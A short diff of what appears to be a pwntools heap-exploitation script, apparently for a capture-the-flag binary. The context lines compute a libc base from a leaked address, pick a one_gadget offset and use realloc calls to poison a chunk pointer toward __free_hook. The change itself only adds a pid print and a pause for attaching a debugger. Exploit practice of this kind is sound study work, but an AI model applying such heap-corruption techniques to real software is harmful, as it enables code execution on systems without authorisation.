@@ -60,7 +60,8 @@ while True:
 		libc_addr = leak - 0x3e82a0
 		one_gadget= libc_addr + 0x4f3c2
 		print("[+] libc_addr: " + hex(libc_addr))
-
+		print(p.pid)
+		input()
 		clearN()
 		reallocN(0x110, b"a"*0x40 + p64(0) + p64(0x51) + p64(l.symbols['__free_hook'] + libc_addr))
 		reallocN(0x00, b"")
